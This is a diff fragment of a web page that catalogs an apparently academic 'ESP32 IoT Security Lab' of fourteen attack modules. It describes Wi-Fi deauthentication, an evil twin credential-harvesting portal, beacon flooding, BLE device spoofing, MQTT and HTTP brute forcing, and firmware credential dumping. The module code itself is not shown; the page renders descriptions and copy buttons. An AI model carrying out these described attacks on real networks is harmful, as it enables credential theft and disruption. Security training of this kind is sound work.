+     desc:"Full monitor mode — captures all 802.11 frames (beacons, auth, deauth, data) across all channels with MAC addresses and RSSI.",
+     libs:["esp_wifi.h","nvs_flash.h"], code:C3},
+  ],
+  attacks:[
+    {title:"4. Deauthentication Attack",
+     desc:"Injects raw 802.11 deauth frames to disconnect a client from its AP. Demonstrates WPA2 management frame vulnerability (pre-802.11w).",
+     libs:["esp_wifi.h","nvs_flash.h"], code:C4},
+    {title:"5. Evil Twin AP + Captive Portal",
+     desc:"Creates a rogue AP cloning a target SSID. DNS hijacking redirects all requests to a credential-harvesting login page.",
+     libs:["WiFi.h","WebServer.h","DNSServer.h"], code:C5},
+    {title:"6. Beacon Flood (Fake AP Spam)",
+     desc:"Injects 802.11 beacon frames with randomized MACs flooding the spectrum with ghost APs — demonstrates DoS on WiFi scanners.",
+     libs:["esp_wifi.h","nvs_flash.h"], code:C6},
+  ],
+  ble:[
+    {title:"7. BLE Active Scanner",
+     desc:"Scans all nearby BLE devices with name, MAC, RSSI, service UUIDs, and manufacturer data with vendor identification.",
+     libs:["BLEDevice.h","BLEScan.h"], code:C7},
+    {title:"8. BLE Device Spoofer",
+     desc:"Impersonates Tile trackers, fitness bands, smart locks, and HID devices by cycling spoofed BLE advertisement data.",
+     libs:["BLEDevice.h","BLEAdvertising.h"], code:C8},
+  ],
+  network:[
+    {title:"9. MQTT Credential Brute Forcer",
+     desc:"Dictionary attack on an MQTT broker. On success, subscribes to '#' wildcard to intercept ALL broker messages.",
+     libs:["WiFi.h","PubSubClient.h"], code:C9},
+    {title:"10. HTTP Basic Auth Brute Force",
+     desc:"Dictionary attack on HTTP Basic Auth — targets router and IoT admin panels. Reports HTTP status codes and halts on success.",
+     libs:["WiFi.h","HTTPClient.h","base64.h"], code:C10},
+    {title:"11. IoT Port Scanner",
+     desc:"TCP connect scan across 18 IoT-critical ports — MQTT, CoAP, Modbus, OPC-UA, MongoDB, Redis, Elasticsearch — with banner grabbing.",
+     libs:["WiFi.h","WiFiClient.h"], code:C11},
+  ],
+  hardware:[
+    {title:"12. I2C Bus Scanner",
+     desc:"Probes all 127 I2C addresses to discover connected chips — identifies EEPROMs, IMUs, RTC modules, and sensors by address.",
+     libs:["Wire.h"], code:C12},
+    {title:"13. I2C EEPROM Hex Dumper",
+     desc:"Full hex+ASCII dump of an AT24Cxx EEPROM — exposes hardcoded credentials, WiFi keys, or device config in non-volatile memory.",
+     libs:["Wire.h"], code:C13},
+    {title:"14. SPIFFS Flash Inspector",
+     desc:"Enumerates the ESP32 internal SPIFFS filesystem, lists all files with previews, and flags credential/configuration files.",
+     libs:["SPIFFS.h","FS.h"], code:C14},
+  ],
+};
+
+const total = Object.values(CODES).reduce((s,a)=>s+a.length,0);
+let activeTab="recon", openCards={}, copiedKey=null;
+
+function setCatVars(cat){
+  document.documentElement.style.setProperty('--cat-fill', cat.fill);
+  document.documentElement.style.setProperty('--cat-bg',   cat.bg);
+  document.documentElement.style.setProperty('--cat-text', cat.text);
+}
+
+function render(){
+  const cat = CATS.find(c=>c.id===activeTab);
+  setCatVars(cat);
+  const codes = CODES[activeTab]||[];
+
+  document.getElementById('root').innerHTML=`
+    <div style="margin-bottom:14px">
+      <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;flex-wrap:wrap">
+        <i class="ti ti-shield-lock" style="font-size:20px;color:var(--text-accent)" aria-hidden="true"></i>
+        <span style="font-size:16px;font-weight:500;color:var(--text-primary);font-family:var(--font-mono)">ESP32 IoT Security Lab</span>
+        <span style="font-size:11px;color:var(--text-muted);font-family:var(--font-mono)">${total} modules</span>
+      </div>
+      <div class="warn-bar">
+        <i class="ti ti-alert-triangle" style="font-size:16px;flex-shrink:0" aria-hidden="true"></i>
+        <span>Authorized lab use only — isolated environment with written permission required.</span>
+      </div>
+    </div>
+
+    <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:16px">
+      ${CATS.map(c=>`
+        <button class="cat-btn ${c.id===activeTab?'active':''}" onclick="switchTab('${c.id}')">
+          <i class="ti ${c.icon}" style="font-size:14px" aria-hidden="true"></i>${c.label}
+          <span style="opacity:.55;font-size:10px">(${CODES[c.id].length})</span>
+        </button>`).join('')}
+    </div>
+
+    <div style="background:var(--surface-1);border:0.5px solid var(--border);border-radius:10px;
+      padding:10px 14px;margin-bottom:14px;display:flex;align-items:center;gap:10px">
+      <div style="width:3px;height:32px;background:var(--cat-fill);border-radius:2px;flex-shrink:0"></div>
+      <div>
+        <div style="font-size:13px;font-weight:500;color:var(--cat-text);font-family:var(--font-mono)">${cat.label}</div>
+        <div style="font-size:11px;color:var(--text-muted);font-family:var(--font-mono)">${codes.length} attack module${codes.length!==1?'s':''} — board: ESP32 DevKit V1 — framework: Arduino</div>
+      </div>
+    </div>
+
+    <div>
+      ${codes.map((item,i)=>{
+        const key=`${activeTab}-${i}`;
+        const isOpen=!!openCards[key];
+        const lines=item.code.split('\n').length;
+        return `
+        <div class="card">
+          <div style="height:3px;background:var(--cat-fill)"></div>
+          <div class="card-header">
+            <div style="flex:1;min-width:0">
+              <div style="font-size:13px;font-weight:500;color:var(--text-primary);font-family:var(--font-mono);margin-bottom:5px">${item.title}</div>
+              <div style="font-size:12px;color:var(--text-secondary);line-height:1.5;margin-bottom:8px">${item.desc}</div>
+              <div style="display:flex;gap:5px;flex-wrap:wrap;align-items:center">
+                ${item.libs.map(l=>`<span class="lib-pill">#include &lt;${l}&gt;</span>`).join('')}
+                <span class="count-pill">${lines} lines</span>
+              </div>
+            </div>
+            <div style="display:flex;gap:6px;flex-shrink:0;align-items:center;margin-left:8px">
+              <button class="btn-sm" onclick="toggleCard('${key}')">
+                <i class="ti ${isOpen?'ti-chevron-up':'ti-chevron-down'}" style="font-size:12px" aria-hidden="true"></i>
+                ${isOpen?'hide':'code'}
+              </button>
+              <button class="btn-copy" id="copy-${key}"
+                style="background:${copiedKey===key?'var(--fill-success)':'var(--fill-accent)'};color:var(--on-accent)"
+                onclick="copyCode('${key}',${i})">
+                <i class="ti ${copiedKey===key?'ti-check':'ti-copy'}" style="font-size:12px" aria-hidden="true"></i>
+                ${copiedKey===key?'done':'copy'}
+              </button>
+            </div>
+          </div>
+          ${isOpen?`<pre class="code-pre"><code>${escHtml(item.code)}</code></pre>`:''}
+        </div>`;
+      }).join('')}
+    </div>
+
+    <div style="text-align:center;margin-top:20px;color:var(--text-muted);font-family:var(--font-mono);font-size:10px;line-height:2">
+      KLS Gogte Institute of Technology, Belagavi, Karnataka<br>
+      All codes for authorized IoT cybersecurity training only
+    </div>
+  `;
+}
+
+function escHtml(s){
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+window.switchTab=function(id){
+  activeTab=id; openCards={}; render();
+};
+
+window.toggleCard=function(key){
+  openCards[key]=!openCards[key]; render();
+};
+
+window.copyCode=function(key,i){
+  const codes=CODES[activeTab];
+  const text=codes[i].code;
+  const prev=copiedKey;
+  copiedKey=key;
+  render();
+  setTimeout(()=>{if(copiedKey===key){copiedKey=null;render();}},2000);
+  try {
+    navigator.clipboard.writeText(text);
+  } catch(e) {
+    const ta=document.createElement('textarea');
+    ta.value=text; document.body.appendChild(ta);
+    ta.select(); document.execCommand('copy');
+    document.body.removeChild(ta);
+  }
+};
+
+render();
+</script>
